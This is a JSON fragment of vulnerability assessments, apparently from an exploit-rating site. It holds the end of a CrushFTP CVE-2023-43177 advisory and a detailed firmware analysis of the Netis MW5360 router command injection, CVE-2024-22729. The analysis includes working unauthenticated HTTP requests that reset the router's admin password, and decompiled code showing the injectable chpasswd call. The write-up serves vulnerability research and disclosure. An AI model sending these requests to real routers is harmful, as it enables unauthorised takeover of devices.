attackers.\r\nSecurity Advisories: Multiple cybersecurity firms have issued advisories warning of active scanning and potential exploitation.\r\nConverge: https://convergetp.com/2023/11/16/crushftp-zero-day-cve-2023-43177-discovered/\r\nArctic Wolf: https://arcticwolf.com/resources/blog/cve-2023-43177/\r\nMetasploit Module: A Metasploit module for exploiting CVE-2023-43177 is available, making the attack more accessible to a wider range of threat actors.\r\nMitigation and Recommendations:\r\n\r\nPatch Immediately: Upgrade to CrushFTP version 10.5.1 or later.\r\nMonitor for Exploitation: Review server logs for unusual AS2 activity or unauthorized file access.\r\nTemporary Workarounds (if patching is not possible):\r\nDisable AS2 functionality.\r\nImplement a web application firewall (WAF) with specific rules to block exploit attempts.\r\nConclusion:\r\n\r\nCVE-2023-43177 poses a severe risk to organizations using CrushFTP due to its high attacker value, easy exploitability, and evidence of active exploitation attempts. Immediate patching and additional security measures are crucial for mitigating this ongoing threat.","score":1,"metadata":{"mitre-tactics":"Lateral Movement","attacker-value":5,"exploitability":5},"tags":[{"id":"392ac474-91f1-4944-ad4f-78ce648b2df7"},{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"}]},{"id":"1671c0a1-d996-4224-8034-3782acdb3bad","editorId":"8a465efa-5959-4307-868a-5c6bd2f9fdc9","topicId":"1f9a291a-bc41-476c-9b62-e4aa59048a20","created":"2024-05-19T11:47:46.622822Z","revisionDate":"2024-06-05T15:15:40.076954Z","document":"Netis Systems Co., Ltd is a global leading provider of networking products and solutions in the data communication industry. It has three worldwide independent brands “netis”, “netcore” and “stonet” .Product lines of Netis company includes Wireless routers, Access point wireless adapters, Dump switches, POE switches, Industrial switches, etc.\r\n\r\nA critical security vulnerability has been identified in the Netis router MW5360 by security researcher `adhikara13`. This vulnerability results in a Blind Command Injection in the \"password\" parameter, leading to unauthorized access. \r\n`Adhikara13` shared details in a POC on Github how to exploit this vulnerability which can be found [here](https://github.com/adhikara13/CVE/blob/main/netis_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md).\r\n\r\nA more detailed analysis on vulnerability is not available so I did some reverse engineering on the firmware to understand the details of this vulnerability. So I download the latest firmware `MW5360-1.0.1.3442` from [here](https://www.netisru.com/Suppory/de_details/id/1/de/136.html) which is a very recent release from April 2024 that is still vulnerable :-(.\r\nI emulated the firmware using `FirmAE` and used `burpsuite` to catch the requests to understand what was going on.\r\n\r\nOn the initial startup of the router, it will show you a welcome message and a setup screen to configure the router administration password and wifi settings including the wifi password which is the same as the administration password.\r\nCapturing this request with `burpsuite` already shows the first design flaw, because this POST request can be executed multiple times without any authentication where the wifi password and administration password can be changed by manipulating the `password` and `wpaPsk` field.\r\n\r\n**POST Request**\r\n```html\r\nPOST /cgi-bin/skk_set.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 201\r\nAccept: text/plain, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://192.168.1.1\r\nReferer: http://192.168.1.1/guide/welcome.html\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\nwlanMode=0\u0026wl_idx=0\u0026ssid2g=bmV0aXMtMDAwMDAw\u0026encrypt=4\u0026wpaPsk=SWwwdmVoYWNraW5n\u0026wpaPskType=2\u0026wpaPskFormat=0\u0026password=SWwwdmVoYWNraW5n\u0026autoUpdate=0\u0026firstSetup=1\u0026quick_set=ap\u0026app=wan_set_shortcut\u0026wl_link=0\r\n```\r\n**Successful Response**\r\n```html\r\nHTTP/1.1 200 OK\r\nDate: Sun, 02 Jun 2024 12:20:24 GMT\r\nServer: Boa/0.94.14rc21\r\nConnection: close\r\n\r\n[\"SUCCESS\"]\r\n```\r\nYou can even modify the request to only manipulate the router administration password by stripping the wifi parameters  from the request.\r\n```html\r\nPOST /cgi-bin/skk_set.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 59\r\nAccept: text/plain, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://192.168.1.1\r\nReferer: http://192.168.1.1/guide/welcome.html\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\npassword=SWwwdmVoYWNraW5n\u0026quick_set=ap\u0026app=wan_set_shortcut\r\n```\r\nSo far, so good, but besides this authentication bypass, there is also a blind command injection vulnerability in the password parameter according to CVE description.\r\n\r\nTo understand this a bit better, we need to dig into the firmware code.\r\nIf you login in into the emulated router software, you will find the main web binary `netis.cgi` in `/bin`. This is a compiled MIPS ELF binary so we need a tool like `ghidra` to decompile and understand the code.\r\n\r\nLoading and analyzing `netis.cgi` in `ghidra` shows that the main program is a wrapper that runs the specific `cgi` request calls like our `skk_set.cgi` that we can see with `burpsuite` when interacting with the Netis web interface.\r\n```C\r\nundefined4 main(undefined4 param_1,char **param_2)\r\n\r\n{\r\n  bool bVar1;\r\n  size_t sVar2;\r\n  int iVar3;\r\n  char *pcVar4;\r\n  char *local_188;\r\n  int local_184;\r\n  int local_17c;\r\n  void *local_160;\r\n  char acStack_15c [256];\r\n  char cStack_5c;\r\n  char acStack_5b [63];\r\n  int local_1c;\r\n  char *local_18 [4];\r\n  \r\n  local_160 = (void *)0x0;\r\n  memset(\u0026cStack_5c,0,0x40);\r\n  local_1c = 0;\r\n  sVar2 = strlen(*param_2);\r\n  while (local_1c \u003c (int)sVar2) {\r\n    memset(\u0026cStack_5c,0,0x40);\r\n    iVar3 = local_1c;\r\n    FUN_0040670c((int)*param_2,'/',\u0026local_1c);\r\n    strncpy(\u0026cStack_5c,*param_2 + iVar3,local_1c - iVar3);\r\n    do {\r\n      local_1c = local_1c + 1;\r\n    } while ((*param_2)[local_1c] == '/');\r\n  }\r\n  local_188 = \u0026cStack_5c;\r\n  bVar1 = false;\r\n  local_18[0] = \"skk_set.cgi\";\r\n  local_18[1] = \"upload_config.cgi\";\r\n  local_18[2] = \"upload_fw.cgi\";\r\n  local_18[3] = (char *)0x0;\r\n  local_17c = 0;\r\n  do {\r\n    if (local_18[local_17c] == (char *)0x0) {\r\nLAB_00405408:\r\n      if (bVar1) {\r\n        iVar3 = open(\"/tmp/lock_all.lock\",0x702,0x1b4);\r\n        if (iVar3 \u003c 0) {\r\n          local_184 = FUN_004050fc();\r\n          if (local_184 \u003c 0) {\r\n            local_184 = 0;\r\n          }\r\n          FUN_00405060(local_184);\r\n          if (2 \u003c local_184) {\r\n            system(\"rm -rf /tmp/lock_all.lock\");\r\n            FUN_00405060(0);\r\n          }\r\n          printf(\"[\\\"LOCK\\\"]\");\r\n          return 0;\r\n        }\r\n        close(iVar3);\r\n      }\r\n      apmib_init();\r\n      FUN_00422c38(\u0026local_160,param_2[1]);\r\n      DAT_00440d40 = FUN_00405190();\r\n      if (local_188 == (char *)0x0) {\r\n        iVar3 = access(\"/tmp/lock_all.lock\",0);\r\n        if (iVar3 == 0) {\r\n          system(\"rm -rf /tmp/lock_all.lock\");\r\n        }\r\n        FUN_004214cc(\u0026local_160);\r\n        printf(\"[\\\"%d\\\"]\",999);\r\n      }\r\n      else {\r\n        pcVar4 = strstr(local_188,\".cgi\");\r\n        if (pcVar4 != (char *)0x0) {\r\n          pcVar4 = strchr(local_188,0x2f);\r\n          if (pcVar4 != (char *)0x0) {\r\n            local_188 = acStack_5b;\r\n          }\r\n          FUN_00405764(local_188,\u0026local_160,acStack_15c);\r\n        }\r\n        fflush(stdout);\r\n        FUN_004214cc(\u0026local_160);\r\n        iVar3 = access(\"/tmp/lock_all.lock\",0);\r\n        if (iVar3 == 0) {\r\n          system(\"rm -rf /tmp/lock_all.lock\");\r\n        }\r\n        FUN_00405060(0);\r\n      }\r\n      return 0;\r\n    }\r\n    iVar3 = strcmp(local_188,local_18[local_17c]);\r\n    if (iVar3 == 0) {\r\n      bVar1 = true;\r\n      goto LAB_00405408;\r\n    }\r\n    local_17c = local_17c + 1;\r\n  } while( true );\r\n}\r\n```\r\nLet's check the code for the `password` string and see where is it used. You can do this by using the search function in `ghidra`.\r\nThis creates quite some hits, but the most interesting hit is the `ex_password` variable which seems to be linked to a script `/bin/script/password.sh`\r\n```C\r\n                             ex_password                                     XREF[2]:     Entry Point(*), \r\n                                                                                          FUN_0041301c:00413180(*)  \r\n        0043be44 2f 62 69        ds         \"/bin/script/password.sh\"\r\n                 6e 2f 73 \r\n                 63 72 69 \r\n```\r\nChecking out function `FUN_0041301c:00413180(*) ` shows `ex_password` a.k.a. `/bin/script/password,sh` is being called by the function `FUN_00402e00(\"%s \u003e /dev/console\",ex_password,pcVar1,param_4);`.\r\n\r\n```C\r\nundefined4 FUN_0041301c(undefined4 *param_1,undefined4 param_2,char *param_3,undefined4 param_4)\r\n\r\n{\r\n  char *pcVar1;\r\n  byte *pbVar2;\r\n  byte abStack_8c [132];\r\n  \r\n  pcVar1 = FUN_00405644(param_1,\"usb3gEnabled\");\r\n  if (pcVar1 != (char *)0x0) {\r\n    FUN_00405644(param_1,\"usb3gPinCode\");\r\n    param_3 = FUN_00405644(param_1,\"usb3gApn\");\r\n    param_4 = 0;\r\n    FUN_00412fe4();\r\n    FUN_00402e00(\"%s \u003e /dev/console\",ex_usbcontrol,param_3,param_4);\r\n  }\r\n  pbVar2 = (byte *)FUN_00405644(param_1,\"ssid2g\");\r\n  if (pbVar2 != (byte *)0x0) {\r\n    FUN_004030f4(abStack_8c,pbVar2);\r\n    strcpy((char *)(pMib + 0x42c1),(char *)abStack_8c);\r\n  }\r\n  FUN_00402e00(\"echo 0 \u003e %s\",\"/proc/http_redirect/enable\",param_3,param_4);\r\n  memset(abStack_8c,0,0x80);\r\n  apmib_get(0x159,abStack_8c);\r\n  pcVar1 = \"/proc/rtl_dnstrap/domain_name\";\r\n  FUN_00402e00(\"echo \\'%s\\' \u003e %s\",abStack_8c,\"/proc/rtl_dnstrap/domain_name\",param_4);\r\n  FUN_00402e00(\"%s \u003e /dev/console\",ex_password,pcVar1,param_4);\r\n  FUN_00402e00(\"%s \u003e /dev/console\",param_2,pcVar1,param_4);\r\n  return 0;\r\n}\r\n```\r\nInteresting, but lets check if this code segment really gets executed if we run the POST request again. A quick trick is to monitor the process list on the router and grep the relevant processes during the execution of the POST request.\r\n```shell\r\n# while true; do ps|grep -e password.sh -e rtl -e http_redirect|grep -v grep;done\r\n 3518 root      1132 R    /bin/sh -c echo 0 \u003e /proc/http_redirect/enable\r\n 3520 root      1132 R    /bin/sh -c echo 'netis.cc' \u003e /proc/rtl_dnstrap/domain\r\n 3531 root      1140 S    /bin/sh -c /bin/script/password.sh \u003e /dev/console\r\n 3538 root       324 R    /bin/script/password.sh\r\n 3531 root      1140 S    /bin/sh -c /bin/script/password.sh \u003e /dev/console\r\n 3538 root      1656 S    /bin/script/password.sh\r\n```\r\nAnd indeed `/bin/script/password.sh` gets executed as well as some other commands listed in the code.\r\n\r\nSo let's now focus on the `/bin/scripts/password.sh`. \r\nChecking out this shell script, it turns out to be a compiled MIPS ELF binary instead of a text readable unix shell script. \r\n\r\nLet's use `ghidra` again to decompile this binary and use the search function to look for the `password` string.\r\nAgain quite some hits, but then I stumble over a very interesting piece of code.\r\n```C\r\n                             s_Changed_Username_and_Password_.._0041dc80     XREF[1]:     FUN_00409590:0040969c(*)  \r\n        0041dc80 43 68 61        ds         \"Changed Username and Password ...........\\n\"\r\n                 6e 67 65 \r\n                 64 20 55 \r\n```\r\nThis is most likely the code section that sets the router administration password.\r\n\r\nChecking out the function `FUN_00409590` is revealing two major issues.\r\n```C\r\nvoid FUN_00409590(void)\r\n\r\n{\r\n  undefined auStack_488 [64];\r\n  undefined auStack_448 [64];\r\n  undefined auStack_408 [1024];\r\n  \r\n  memset(auStack_408,0,0x400);\r\n  memset(auStack_488,0,0x40);\r\n  memset(auStack_448,0,0x40);\r\n  apmib_get(0x15d,auStack_488);\r\n  apmib_get(0x15e,auStack_448);\r\n  RunSystemCmd(\"echo \\\"root::0:0:root:/:/bin/sh\\\" \u003e /var/passwd\");\r\n  RunSystemCmd(\"echo \\\"nobody:x:0:0:nobody:/:/dev/null\\\" \u003e\u003e /var/passwd\");\r\n  RunSystemCmd(\"echo root:%s | chpasswd -m\",auStack_448);\r\n  RunSystemCmd(\"echo \\\"root:x:0:root\\\" \u003e /var/group\");\r\n  RunSystemCmd(\"echo \\\"nobody:x:0:nobody\\\" \u003e\u003e /var/group\");\r\n  RunSystemCmd(\"chmod 755 /var/passwd\");\r\n  RunSystemCmd(\"chmod 755 /var/group\");\r\n  fwrite(\"Changed Username and Password ...........\\n\",1,0x2a,stderr);\r\n  return;\r\n}\r\n```\r\nThe first issue is that the router administration password is directly linked to the root password of router itself. \r\nOeps! That is not really best practice and attackers love these things.\r\n\r\nThe second issue is the blind command injection where the vulnerable code `RunSystemCmd(\"echo root:%s | chpasswd -m\",auStack_448);` allows an attacker to manipulate password argument represented by `auStack_448` and inject and execute code using the unix backtics.\r\nThis explains why the password parameter is indeed vulnerable of blind command injection.\r\n\r\nThe `RunSystemCmd` function is just a piece a code which is defined in the library `libapmib.so` and executes a unix command line using the `system()` call.\r\n```C\r\nvoid RunSystemCmd(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)\r\n\r\n{\r\n  undefined4 local_res4;\r\n  undefined4 local_res8;\r\n  undefined4 local_resc;\r\n  char acStack_118 [256];\r\n  undefined4 *local_18;\r\n  \r\n  local_res4 = param_2;\r\n  local_res8 = param_3;\r\n  local_resc = param_4;\r\n  memset(acStack_118,0,0x100);\r\n  local_18 = \u0026local_res4;\r\n  vsprintf(acStack_118,param_1,local_18);\r\n  system(acStack_118);\r\n  return;\r\n}\r\n```\r\nI have created an exploit that is published as official module [Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188) in Metasploit.\r\nUnfortunately there is no mitigation, because the latest firmware from April 2024 is still vulnerable. So be on the alert when suddenly your router administration password changes unexpectedly and you can not login into your router anymore.\r\n\r\n## References\r\n[CVE-2024-22729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22729)\r\n[Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188)\r\n[Firmware MW5360-1.0.1.3442](https://www.netisru.com/Suppory/de_details/id/1/de/136.html)\r\n\r\n### Credits\r\nCredits go to the security researcher below who discovered this vulnerability.\r\n* `adhikara13`\r\n\r\n","score":2,"metadata":{"mitre-tactics":"Execution","attacker-value":5,"exploitability":5},"tags":[{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"}]},{"id":"46f2ab9e-5758-48a6-8c91-50f57afef149","editorId":"1f5c188b-76fd-4e84-b90e-cadaa8bdcd26","topicId":"f663a641-1dcc-4196-9477-9cf8ab5a5b75","created":"2024-05-16T15:48:06.246489Z","revisionDate":"2024-05-16T15:48:06.244141Z","document":"","score":1,"metadata":{"mitre-tactics":"Collection","attacker-value":4,"exploitability":3},"tags":[{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"}]}]}

